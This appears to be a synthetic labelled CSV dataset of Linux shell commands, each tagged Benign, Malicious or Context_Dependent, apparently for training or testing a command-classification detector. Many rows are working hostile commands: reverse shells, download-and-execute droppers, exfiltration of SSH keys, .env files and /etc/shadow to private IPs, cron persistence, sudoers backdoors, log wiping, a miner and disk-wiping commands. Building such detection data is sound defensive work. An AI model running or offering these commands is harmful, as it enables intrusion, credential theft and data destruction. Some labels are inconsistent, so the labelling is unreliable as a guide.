command,label,original_label,mitre_id
curl -s http://10.100.200.1/payload.sh -o /tmp/.payload.sh && bash /tmp/.payload.sh,Malicious,Synthetic,Synthetic
curl -X POST -d @/var/www/html/.env http://172.16.5.10:7777/exfil,Malicious,Synthetic,Synthetic
volatility -f mem.dump imageinfo,Context_Dependent,Synthetic,Synthetic
find / -name '*.conf' -exec grep -l password {} \;,Context_Dependent,Synthetic,Synthetic
lsof -i :22,Benign,Synthetic,Synthetic
"socat TCP-LISTEN:8443,fork -",Context_Dependent,Synthetic,Synthetic
whereis python3,Benign,Synthetic,Synthetic
grep -i 'failed' /var/log/nginx/error.log,Benign,Synthetic,Synthetic
strings /dev/sda | grep password,Context_Dependent,Synthetic,Synthetic
timedatectl status,Benign,Synthetic,Synthetic
systemctl is-active apache2,Benign,Synthetic,Synthetic
systemctl status redis,Benign,Synthetic,Synthetic
john shadow.txt --wordlist=/usr/share/wordlists/rockyou.txt,Malicious,Synthetic,Synthetic
pip install --upgrade celery,Benign,Synthetic,Synthetic
mv /tmp/main.go.old /tmp/main.go,Benign,Synthetic,Synthetic
bash -i >& /dev/tcp/10.10.14.3/8080 0>&1,Malicious,Synthetic,Synthetic
nc -e /bin/sh 10.0.0.1 4444,Malicious,Synthetic,Synthetic
chgrp developers /shared/project,Benign,Synthetic,Synthetic
ssh-agent bash,Benign,Synthetic,Synthetic
journalctl -u sshd --no-pager -n 20,Benign,Synthetic,Synthetic
pip install --upgrade gunicorn,Benign,Synthetic,Synthetic
df -hT,Benign,Synthetic,Synthetic
wget http://10.0.0.1/backdoor -O /tmp/bd && chmod +x /tmp/bd && /tmp/bd,Malicious,Synthetic,Synthetic
journalctl -u elasticsearch --no-pager -n 20,Benign,Synthetic,Synthetic
ssh -D 1080 user@server,Context_Dependent,Synthetic,Synthetic
usermod -aG docker $USER,Benign,Synthetic,Synthetic
nano /home/deploy/index.html,Benign,Synthetic,Synthetic
pip install numpy,Benign,Synthetic,Synthetic
sudo ufw allow 80/tcp,Benign,Synthetic,Synthetic
curl -X POST -d @/home/user/.ssh/id_rsa http://10.0.0.5:31337/exfil,Malicious,Synthetic,Synthetic
cat /etc/ssh/ssh_config,Benign,Synthetic,Synthetic
"socat TCP-LISTEN:9001,fork -",Context_Dependent,Synthetic,Synthetic
printenv | grep -i aws,Context_Dependent,Synthetic,Synthetic
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -10,Benign,Synthetic,Synthetic
"socat TCP-LISTEN:4443,fork -",Context_Dependent,Synthetic,Synthetic
python3 -m http.server 9000,Context_Dependent,Synthetic,Synthetic
docker network inspect bridge,Benign,Synthetic,Synthetic
uname -m,Benign,Synthetic,Synthetic
netstat -rn,Benign,Synthetic,Synthetic
base64 /etc/ssh/sshd_config | curl -d @- http://10.100.200.1:9001/,Malicious,Synthetic,Synthetic
docker-compose down,Benign,Synthetic,Synthetic
head -100 /var/log/nginx/access.log,Benign,Synthetic,Synthetic
export HISTFILE=/dev/null,Malicious,Synthetic,Synthetic
vim /home/user/projects/config.yaml,Benign,Synthetic,Synthetic
curl -X POST -d @/opt/app/.env http://192.168.56.1:6666/exfil,Malicious,Synthetic,Synthetic
systemctl list-units --type=service --state=running,Benign,Synthetic,Synthetic
md5sum image.iso,Benign,Synthetic,Synthetic
nano /var/www/nginx.conf,Benign,Synthetic,Synthetic
docker logs -f worker,Benign,Synthetic,Synthetic
curl -X POST -d @/etc/shadow http://192.168.0.10:4444/exfil,Malicious,Synthetic,Synthetic
openssl req -new -x509 -days 365 -nodes -out cert.pem -keyout key.pem,Benign,Synthetic,Synthetic
python -m SimpleHTTPServer 8888,Context_Dependent,Synthetic,Synthetic
dd if=/dev/urandom of=/dev/sda bs=4M,Malicious,Synthetic,Synthetic
chown -R root:root /home/user,Benign,Synthetic,Synthetic
nc -zv 192.168.1.1 1-1000,Context_Dependent,Synthetic,Synthetic
systemctl restart haproxy,Benign,Synthetic,Synthetic
cp /srv/www/app.py /srv/www/app.py.bak,Benign,Synthetic,Synthetic
"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.1:9001",Malicious,Synthetic,Synthetic
docker logs --tail 200 worker,Benign,Synthetic,Synthetic
grep -ri 'token' /etc/,Context_Dependent,Synthetic,Synthetic
curl http://10.0.0.1/payload.sh | bash,Malicious,Synthetic,Synthetic
vim /var/www/index.html,Benign,Synthetic,Synthetic
kubectl exec -it web-abc123 -- bash,Benign,Synthetic,Synthetic
rm -rf /home/ /var/ /etc/,Malicious,Synthetic,Synthetic
head -50 /etc/apache2/apache2.conf,Benign,Synthetic,Synthetic
curl -X POST -d @/root/.ssh/id_rsa http://192.168.1.100:1337/exfil,Malicious,Synthetic,Synthetic
pstree -p,Benign,Synthetic,Synthetic
id -u,Benign,Synthetic,Synthetic
ps auxww,Benign,Synthetic,Synthetic
apt update,Benign,Synthetic,Synthetic
"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((""10.0.0.5"",9090));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",Malicious,Synthetic,Synthetic
git rebase main,Benign,Synthetic,Synthetic
find / -name '*.conf' -exec grep -l 'password' {} \; 2>/dev/null,Malicious,Synthetic,Synthetic
git clean -fd,Benign,Synthetic,Synthetic
echo '/var/tmp/.implant &' >> /etc/rc.local,Malicious,Synthetic,Synthetic
git switch main,Benign,Synthetic,Synthetic
echo 'user ALL=(ALL) NOPASSWD: ALL' | sudo tee /etc/sudoers.d/pwned,Malicious,Synthetic,Synthetic
chmod -R 755 /var/www/html,Benign,Synthetic,Synthetic
chown -R www-data:www-data /opt/services,Benign,Synthetic,Synthetic
echo '' > /var/log/syslog,Malicious,Synthetic,Synthetic
vim /var/www/html/package.json,Benign,Synthetic,Synthetic
cat /etc/ssh/sshd_config,Benign,Synthetic,Synthetic
vim /home/admin/healthcheck.sh,Benign,Synthetic,Synthetic
socat TCP4:10.0.0.1:4444 EXEC:/bin/bash,Malicious,Synthetic,Synthetic
nmap -sn 10.10.10.0/24,Context_Dependent,Synthetic,Synthetic
docker inspect cache,Benign,Synthetic,Synthetic
vim /var/log/docker-compose.yml,Benign,Synthetic,Synthetic
sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config,Malicious,Synthetic,Synthetic
vim /srv/www/backup.sh,Benign,Synthetic,Synthetic
mv /tmp/malware /usr/lib/libpam.so.1,Malicious,Synthetic,Synthetic
md5sum -c checksums.md5,Benign,Synthetic,Synthetic
du -sh /home/user/projects,Benign,Synthetic,Synthetic
wget -q http://dl.xmrig.com/xmrig -O /dev/shm/.proc && nohup /dev/shm/.proc --donate-level 0 -o pool.hashvault.pro:80 &,Malicious,Synthetic,Synthetic
vim /home/deploy/deploy.sh,Benign,Synthetic,Synthetic
brew update,Benign,Synthetic,Synthetic
readlink -f /usr/bin/python3,Benign,Synthetic,Synthetic
nano /var/lib/main.go,Benign,Synthetic,Synthetic
openssl enc -aes-256-cbc -in secrets.txt -out secrets.enc,Context_Dependent,Synthetic,Synthetic
ncat -lvnp 9001,Context_Dependent,Synthetic,Synthetic
last -a,Benign,Synthetic,Synthetic
nc -zv 192.168.0.10 22,Context_Dependent,Synthetic,Synthetic
wget http://172.16.0.1:8080/beacon.sh -O /dev/shm/.proc/beacon.sh && chmod +x /dev/shm/.proc/beacon.sh && /dev/shm/.proc/beacon.sh,Malicious,Synthetic,Synthetic
kubectl get pods,Benign,Synthetic,Synthetic
chmod 664 README.md,Benign,Synthetic,Synthetic
curl -o /dev/null -w '%{http_code}' https://example.com,Benign,Synthetic,Synthetic
userdel olduser,Benign,Synthetic,Synthetic
chown -R deploy:deploy /var/log,Benign,Synthetic,Synthetic
sudo -i,Benign,Synthetic,Synthetic
pip install boto3,Benign,Synthetic,Synthetic
for user in $(cat /etc/passwd | cut -d: -f1); do crontab -l -u $user 2>/dev/null; done,Malicious,Synthetic,Synthetic
hostname -I,Benign,Synthetic,Synthetic
ls /home/admin/,Benign,Synthetic,Synthetic
chmod 755 Makefile,Benign,Synthetic,Synthetic
curl -sSL http://10.0.0.1/dropper.sh | bash -s --,Malicious,Synthetic,Synthetic
tail -20 /etc/redis/redis.conf,Benign,Synthetic,Synthetic
chown -R root:root /var/www/html,Benign,Synthetic,Synthetic
ping -c 1 localhost,Benign,Synthetic,Synthetic
grep -i 'traceback' /var/log/syslog,Benign,Synthetic,Synthetic
"python3 -c 'import base64; print(base64.b64encode(b""test""))'",Context_Dependent,Synthetic,Synthetic
du -ah /var/lib | sort -rh | head -10,Benign,Synthetic,Synthetic
ps aux | grep python,Benign,Synthetic,Synthetic
tail -20 /etc/mysql/my.cnf,Benign,Synthetic,Synthetic
ls /home/user/projects/,Benign,Synthetic,Synthetic
docker stop web,Benign,Synthetic,Synthetic
docker logs -f web,Benign,Synthetic,Synthetic
mimikatz.exe,Malicious,Synthetic,Synthetic
nc -zv 172.16.5.10 22,Context_Dependent,Synthetic,Synthetic
lsmem,Benign,Synthetic,Synthetic
journalctl -u nginx --no-pager -n 20,Benign,Synthetic,Synthetic
systemctl restart apache2,Benign,Synthetic,Synthetic
vgs,Benign,Synthetic,Synthetic
nmap -sT 172.16.0.0/24,Context_Dependent,Synthetic,Synthetic
lsof -i :443,Benign,Synthetic,Synthetic
curl http://10.0.0.5:9090/rev.py | bash,Malicious,Synthetic,Synthetic
dig +short google.com,Benign,Synthetic,Synthetic
systemctl restart nginx,Benign,Synthetic,Synthetic
grep -r 'password' /etc/,Context_Dependent,Synthetic,Synthetic
systemctl status nginx,Benign,Synthetic,Synthetic
nc -lvnp 4443,Context_Dependent,Synthetic,Synthetic
sudo systemctl restart nginx,Benign,Synthetic,Synthetic
seq 1 10,Benign,Synthetic,Synthetic
echo $SHELL,Benign,Synthetic,Synthetic
docker restart web,Benign,Synthetic,Synthetic
apt remove nginx,Benign,Synthetic,Synthetic
cp /var/www/monitor.py /var/www/monitor.py.bak,Benign,Synthetic,Synthetic
cp /var/www/html/package.json /var/www/html/package.json.bak,Benign,Synthetic,Synthetic
nmap -sT 10.10.10.0/24,Context_Dependent,Synthetic,Synthetic
find /tmp -type f -atime +7 -exec rm {} \;,Benign,Synthetic,Synthetic
ssh -o StrictHostKeyChecking=no root@10.0.0.2 'curl http://10.0.0.1/shell|bash',Malicious,Synthetic,Synthetic
cp /srv/www/backup.sh /srv/www/backup.sh.bak,Benign,Synthetic,Synthetic
git bisect good v1.0,Benign,Synthetic,Synthetic
journalctl -u fail2ban --since '1 hour ago',Benign,Synthetic,Synthetic
journalctl -u nomad --no-pager -n 20,Benign,Synthetic,Synthetic
ssh ubuntu@production 'uptime',Benign,Synthetic,Synthetic
curl -X POST -d @/root/.ssh/id_rsa http://10.10.14.5:5555/exfil,Malicious,Synthetic,Synthetic
chown -R deploy:deploy /srv/www,Benign,Synthetic,Synthetic
nano /var/www/Dockerfile,Benign,Synthetic,Synthetic
nc -lvnp 7777,Context_Dependent,Synthetic,Synthetic
cat /etc/hostname | base64,Context_Dependent,Synthetic,Synthetic
cp /var/log/index.html /var/log/index.html.bak,Benign,Synthetic,Synthetic
nano /home/deploy/healthcheck.sh,Benign,Synthetic,Synthetic
stat -c %U:%G /etc/passwd,Benign,Synthetic,Synthetic
ln -sf /dev/null ~/.bash_history,Malicious,Synthetic,Synthetic
mv /srv/www/backup.sh.old /srv/www/backup.sh,Benign,Synthetic,Synthetic
curl http://172.16.0.1:8080/implant | bash,Malicious,Synthetic,Synthetic
cat /etc/environment,Benign,Synthetic,Synthetic
ls -la /tmp/,Benign,Synthetic,Synthetic
nano /home/user/healthcheck.sh,Benign,Synthetic,Synthetic
ssh -L 8080:localhost:80 user@server,Benign,Synthetic,Synthetic
dotnet run,Benign,Synthetic,Synthetic
grep -ri 'api_key' /etc/,Context_Dependent,Synthetic,Synthetic
mv /opt/services/settings.json.old /opt/services/settings.json,Benign,Synthetic,Synthetic
base64 /var/www/html/.env | curl -d @- http://172.16.5.10:7777/,Malicious,Synthetic,Synthetic
ls -lah /var/www,Benign,Synthetic,Synthetic
screen -ls,Benign,Synthetic,Synthetic
(crontab -l; echo '*/5 * * * * curl http://172.16.0.50/9090/beacon | bash') | crontab -,Malicious,Synthetic,Synthetic
git commit --amend --no-edit,Benign,Synthetic,Synthetic
git log --graph --oneline -20,Benign,Synthetic,Synthetic
vim /srv/www/nginx.conf,Benign,Synthetic,Synthetic
nc -e /bin/bash 192.168.56.1 4444,Malicious,Synthetic,Synthetic
grep -c 'failed' /var/log/syslog,Benign,Synthetic,Synthetic
dig MX google.com,Benign,Synthetic,Synthetic
grep -ri 'token' /srv/,Context_Dependent,Synthetic,Synthetic
cp /srv/www/Makefile /srv/www/Makefile.bak,Benign,Synthetic,Synthetic
curl -s http://192.168.1.50/shell.sh -o /run/shm/.shell.sh && bash /run/shm/.shell.sh,Malicious,Synthetic,Synthetic
journalctl -u vault --no-pager -n 20,Benign,Synthetic,Synthetic
systemctl status httpd,Benign,Synthetic,Synthetic
cat /home/*/.ssh/id_rsa 2>/dev/null,Malicious,Synthetic,Synthetic
git stash,Benign,Synthetic,Synthetic
pip freeze,Benign,Synthetic,Synthetic
journalctl -u httpd --no-pager -n 20,Benign,Synthetic,Synthetic
echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,Context_Dependent,Synthetic,Synthetic
chown -R www-data:www-data /srv/www,Benign,Synthetic,Synthetic
cat /var/www/html/.env | nc 172.16.5.10 7777,Malicious,Synthetic,Synthetic
mv /home/user/projects/README.md.old /home/user/projects/README.md,Benign,Synthetic,Synthetic
(crontab -l; echo '*/5 * * * * /tmp/.backdoor') | crontab -,Malicious,Synthetic,Synthetic
chown www-data:www-data /srv/www,Benign,Synthetic,Synthetic
grep -i 'Exception' /var/log/syslog,Benign,Synthetic,Synthetic
scp user@server:/var/log/app.log .,Benign,Synthetic,Synthetic
curl http://172.16.5.10:443/agent | bash,Malicious,Synthetic,Synthetic
mv /var/log/index.html.old /var/log/index.html,Benign,Synthetic,Synthetic
cat /etc/sudoers | nc 10.10.14.3 1337,Malicious,Synthetic,Synthetic
nano /srv/www/settings.json,Benign,Synthetic,Synthetic
du -sh /var/www,Benign,Synthetic,Synthetic
finger $USER,Benign,Synthetic,Synthetic
gobuster dir -u http://target.com -w wordlist.txt,Context_Dependent,Synthetic,Synthetic
flask run --host=0.0.0.0,Benign,Synthetic,Synthetic
nano /home/user/config.yaml,Benign,Synthetic,Synthetic
journalctl -u consul --no-pager -n 20,Benign,Synthetic,Synthetic
make install,Benign,Synthetic,Synthetic
journalctl --since '1 hour ago',Benign,Synthetic,Synthetic
ssh -L 1080:localhost:1080 user@jump,Context_Dependent,Synthetic,Synthetic
wget -q http://attacker.com/miner -O /dev/shm/.hidden && bash /dev/shm/.hidden,Malicious,Synthetic,Synthetic
journalctl -u elasticsearch --since '1 hour ago',Benign,Synthetic,Synthetic
ncat -lvnp 31337,Context_Dependent,Synthetic,Synthetic
(crontab -l; echo '*/5 * * * * curl http://10.0.0.5/31337/beacon | bash') | crontab -,Malicious,Synthetic,Synthetic
cp /etc/nginx/deploy.sh /etc/nginx/deploy.sh.bak,Benign,Synthetic,Synthetic
docker restart cache,Benign,Synthetic,Synthetic
ls -la /etc/init.d/,Benign,Synthetic,Synthetic
echo '/run/shm/.implant &' >> /etc/rc.local,Malicious,Synthetic,Synthetic
chmod 664 healthcheck.sh,Benign,Synthetic,Synthetic
vim /home/deploy/requirements.txt,Benign,Synthetic,Synthetic
mv /etc/nginx/deploy.sh.old /etc/nginx/deploy.sh,Benign,Synthetic,Synthetic
nano /var/www/monitor.py,Benign,Synthetic,Synthetic
set +o history,Malicious,Synthetic,Synthetic
nc -zv 192.168.1.1 22,Context_Dependent,Synthetic,Synthetic
docker ps -a,Benign,Synthetic,Synthetic
pkill -f 'monitoring',Context_Dependent,Synthetic,Synthetic
systemctl status apache2,Benign,Synthetic,Synthetic
ssh deploy@production,Benign,Synthetic,Synthetic
grep -i 'WARN' /var/log/nginx/error.log,Benign,Synthetic,Synthetic
du -sh /srv/www,Benign,Synthetic,Synthetic
chown nginx:nginx /home/admin,Benign,Synthetic,Synthetic
ssh deploy@app-01 'uptime',Benign,Synthetic,Synthetic
find / -name '*.pem' 2>/dev/null,Context_Dependent,Synthetic,Synthetic
docker volume ls,Benign,Synthetic,Synthetic
journalctl -u redis --no-pager -n 20,Benign,Synthetic,Synthetic
docker rm old-container,Benign,Synthetic,Synthetic
find /home -maxdepth 2 -name '.bashrc',Benign,Synthetic,Synthetic
fail2ban-client status,Benign,Synthetic,Synthetic
ls -lt /var/www | head -10,Benign,Synthetic,Synthetic
cp /etc/nginx/monitor.py /etc/nginx/monitor.py.bak,Benign,Synthetic,Synthetic
ss -tuln,Benign,Synthetic,Synthetic
chkconfig --list,Benign,Synthetic,Synthetic
mv /home/deploy/requirements.txt.old /home/deploy/requirements.txt,Benign,Synthetic,Synthetic
yum list installed,Benign,Synthetic,Synthetic
ping -c 4 internal-dns,Benign,Synthetic,Synthetic
loginctl show-session 1,Benign,Synthetic,Synthetic
journalctl -u memcached --since '1 hour ago',Benign,Synthetic,Synthetic
journalctl -u docker --no-pager -n 50,Benign,Synthetic,Synthetic
grep -ri 'secret' /srv/,Context_Dependent,Synthetic,Synthetic
du -ah /var/log | sort -rh | head -10,Benign,Synthetic,Synthetic
pvs,Benign,Synthetic,Synthetic
ncat -lvnp 4444,Context_Dependent,Synthetic,Synthetic
(crontab -l; echo '*/5 * * * * curl http://172.16.5.10/1234/beacon | bash') | crontab -,Malicious,Synthetic,Synthetic
chmod 700 Dockerfile,Benign,Synthetic,Synthetic
find /var/www -user www-data -type f,Benign,Synthetic,Synthetic
less /var/log/kern.log,Benign,Synthetic,Synthetic
ls -lah /var/log,Benign,Synthetic,Synthetic
strings /proc/*/environ 2>/dev/null | grep -i pass,Malicious,Synthetic,Synthetic
ssh admin@app-01,Benign,Synthetic,Synthetic
ssh -D 6379 user@server,Context_Dependent,Synthetic,Synthetic
bash -i >& /dev/tcp/10.20.30.40/7777 0>&1,Malicious,Synthetic,Synthetic
nano /srv/www/app.py,Benign,Synthetic,Synthetic
du -sh /etc/nginx,Benign,Synthetic,Synthetic
vim /home/admin/Dockerfile,Benign,Synthetic,Synthetic
cp /var/log/docker-compose.yml /var/log/docker-compose.yml.bak,Benign,Synthetic,Synthetic
curl -s http://172.16.0.1/implant -o /tmp/.hidden/.implant && bash /tmp/.hidden/.implant,Malicious,Synthetic,Synthetic
journalctl -u fail2ban --no-pager -n 20,Benign,Synthetic,Synthetic
mv /opt/app/app.py.old /opt/app/app.py,Benign,Synthetic,Synthetic
openssl enc -aes-256-cbc -salt -in /home/user/important.doc -out /home/user/important.doc.enc -k ransomkey && rm /home/user/important.doc,Malicious,Synthetic,Synthetic
nc -zv 192.168.1.100 1-1000,Context_Dependent,Synthetic,Synthetic
pip install redis,Benign,Synthetic,Synthetic
systemctl status rsyslog,Benign,Synthetic,Synthetic
pgrep -la python,Benign,Synthetic,Synthetic
journalctl -u postgresql --since '1 hour ago',Benign,Synthetic,Synthetic
mv /home/user/monitor.py.old /home/user/monitor.py,Benign,Synthetic,Synthetic
du -ah /home/admin | sort -rh | head -10,Benign,Synthetic,Synthetic
tcpdump -i eth0,Context_Dependent,Synthetic,Synthetic
chage -l $USER,Benign,Synthetic,Synthetic
curl -X POST -d @/etc/passwd http://10.0.0.1:8080/exfil,Malicious,Synthetic,Synthetic
vim /home/user/healthcheck.sh,Benign,Synthetic,Synthetic
mv /home/user/nginx.conf.old /home/user/nginx.conf,Benign,Synthetic,Synthetic
cp /var/www/nginx.conf /var/www/nginx.conf.bak,Benign,Synthetic,Synthetic
borgbackup create ::archive /home,Benign,Synthetic,Synthetic
loginctl list-sessions,Benign,Synthetic,Synthetic
systemctl is-enabled sshd,Benign,Synthetic,Synthetic
docker exec api ls /app,Benign,Synthetic,Synthetic
chmod u+x script.sh,Benign,Synthetic,Synthetic
pip install pandas,Benign,Synthetic,Synthetic
ssh -L 3306:localhost:3306 user@jump,Context_Dependent,Synthetic,Synthetic
docker logs --tail 200 db,Benign,Synthetic,Synthetic
ssh -D 8080 user@server,Context_Dependent,Synthetic,Synthetic
/bin/sh -i >& /dev/tcp/192.168.1.100/1337 0>&1,Malicious,Synthetic,Synthetic
tee output.log,Benign,Synthetic,Synthetic
ip -6 addr,Benign,Synthetic,Synthetic
python3 -m http.server 8000,Context_Dependent,Synthetic,Synthetic
curl -s http://172.16.5.10/dropper -o /dev/shm/.proc/.dropper && bash /dev/shm/.proc/.dropper,Malicious,Synthetic,Synthetic
ifconfig,Benign,Synthetic,Synthetic
echo 0 > /proc/sys/kernel/modules_disabled && insmod /tmp/evil.ko,Malicious,Synthetic,Synthetic
vim /opt/services/README.md,Benign,Synthetic,Synthetic
journalctl -u cron --since '1 hour ago',Benign,Synthetic,Synthetic
unset HISTFILE,Malicious,Synthetic,Synthetic
grep -r 'password' /var/www/,Context_Dependent,Synthetic,Synthetic
systemctl restart sshd,Benign,Synthetic,Synthetic
sha256sum backup.tar.gz,Benign,Synthetic,Synthetic
ls -lah /home/user/projects,Benign,Synthetic,Synthetic
curl -s http://10.10.14.3/rev.py -o /tmp/.rev.py && bash /tmp/.rev.py,Malicious,Synthetic,Synthetic
"nmap -p 22,80,443 192.168.1.1",Context_Dependent,Synthetic,Synthetic
git bisect bad HEAD,Benign,Synthetic,Synthetic
vim /var/log/config.yaml,Benign,Synthetic,Synthetic
xxd -r hexfile,Context_Dependent,Synthetic,Synthetic
echo '' > /var/log/auth.log,Malicious,Synthetic,Synthetic
ip neigh,Benign,Synthetic,Synthetic
docker logs app,Benign,Synthetic,Synthetic
dig google.com,Benign,Synthetic,Synthetic
grep -ri 'token' /var/www/,Context_Dependent,Synthetic,Synthetic
systemctl is-active docker,Benign,Synthetic,Synthetic
md5sum important_file.tar.gz,Benign,Synthetic,Synthetic
go test ./...,Benign,Synthetic,Synthetic
journalctl -u rsyslog --no-pager -n 20,Benign,Synthetic,Synthetic
usermod -aG sudo backdoor,Malicious,Synthetic,Synthetic
grep -ri 'db_password\|db_pass\|mysql_pwd' /var/www/,Malicious,Synthetic,Synthetic
df -h /home/user,Benign,Synthetic,Synthetic
cp /home/user/projects/README.md /home/user/projects/README.md.bak,Benign,Synthetic,Synthetic
